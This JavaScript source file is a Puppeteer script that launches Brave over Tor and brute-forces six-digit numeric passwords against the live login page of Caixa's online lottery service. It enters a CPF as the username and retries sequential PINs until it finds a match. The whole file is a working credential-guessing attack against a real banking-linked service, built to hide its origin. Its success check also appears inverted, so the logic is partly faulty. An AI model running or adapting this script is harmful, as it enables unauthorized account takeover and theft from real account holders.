import puppeteer from 'puppeteer';
import fetch from 'node-fetch';
import FormData from 'form-data';
import sleep from 'sleep';
import * as uuid from 'uuid';

async function defineFormWithPass(passwordToTry, user){

    // Url require identification 
    var idA = uuid.v4();
    var idB = uuid.v4();

    // Open a new browser with tor using brave
    var browser = await puppeteer.launch({
        headless: false, // show execution on screen
        executablePath: "/usr/bin/brave-browser", // Brave - linux executable path (optional)
        args: ["--incognito", "--tor"] // args to open with tor (optional)
    });
    
    // Get all opened pages 
    var pages = await browser.pages();

    // Select first one
    var page = pages[0]

    page.browserContext();

    // Tor is so slow. Change default timeout
    page.setDefaultNavigationTimeout(30000000);
    page.setDefaultTimeout(30000000);

    // Open login page
    await page.goto(`https://login.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?client_id=cli-web-lce&redirect_uri=https%3A%2F%2Fwww.loteriasonline.caixa.gov.br%2Fsilce-web%2F%3Futm_source%3Dsite_loterias%26utm_medium%3Dcross%26utm_campaign%3Dloteriasonline%26utm_term%3Dmega%23%2Fhome&state=${idA}&response_mode=fragment&response_type=code&scope=openid&nonce=${idB}`);

    try {
        
        var document = await page.$('body');
        
        var form =  await document.$("form");

        var userName = await form.$("#username");

        var username = String(user);
        await userName.type(username, { delay: 90 });
        
        var btnNext = await form.$("#button-submit");

        // wait until page reload
        await Promise.all([
                await btnNext.click(),
                page.waitForNavigation({ waitUntil: 'networkidle0' }),
        ]);
        
        var stepForm =  await page.$("body");
        
        var passInput = await stepForm.$("#password");
        
        var pass = String(passwordToTry);
        await passInput.type(pass, { delay: 90 });

        // Get info from form (action)
        // var url = await (await form.getProperty('action'))._remoteObject.value

        // Call fetch function - It does not work on the site caixa.com
        // var isSuccess = await makeRequest(url, passwordToTry, user);
        
        var btnLogin = await stepForm.$(".button-group button");
        
        // wait until page reload
        await Promise.all([
            await btnLogin.click(),
            page.waitForNavigation({ waitUntil: 'networkidle0' }),
        ]);
        
        var stepLogin =  await page.$("form");

        var hasError =  await stepLogin.$(".alert-error");

        var isSuccess = hasError != null;

        await page.close()
        // await browser.close();

        // Increment password
        var newValue = parseInt(passwordToTry) + 1;

            if (!isSuccess) {
                console.log("Invalid Password: ", passwordToTry);
                main(newValue, user);
            } else {
                console.log("Success - Password Match: ", passwordToTry);
            }

    } catch (error) {
        console.log("Error");
        console.log(error.message);
        sleep.msleep(3000);
        await page.close();
    }
}

// Unused function
var getResult = async function(url, pass, user){

    const formData = new FormData();
    formData.append('username', user);
    formData.append('password', pass);

    try {
        var result = await fetch(url, {
            headers:{
                'Content-Type': 'application/x-www-form-urlencoded, charset=UTF-8'
            },
            method: "POST",
            redirect: 'manual',
            data: formData
        });

        return result;
    } catch(err) {
        return err;
    }
};

// Unused function
var makeRequest = async function(url, triedPass, user){
    var res = await getResult(url, triedPass, user);
    var isSuccess = res.ok;
    return isSuccess;
};

async function main(passNumber, cpf){
    
    console.log("Next Try With Password: ",passNumber)
    var valueString = String(passNumber);
    var passwordToTry = "";
    
    if(valueString.length === 1){
        passwordToTry = "00000" + valueString;
    }
    else if (valueString.length === 2) {
        passwordToTry = "0000" + valueString;
    }
    else if(valueString.length === 3) {
        passwordToTry = "000" + valueString;
    }
    else if (valueString.length === 4) {
        passwordToTry = "00" + valueString;
    }
    else if (valueString.length === 5)
    {
        passwordToTry = "0" + valueString;
    }
    else if (valueString.length === 6) {
        passwordToTry = valueString;
    }
    
    await defineFormWithPass(passwordToTry, cpf);
    
}

// Start with initial password and cpf
main(123456, "000.000.000-00");
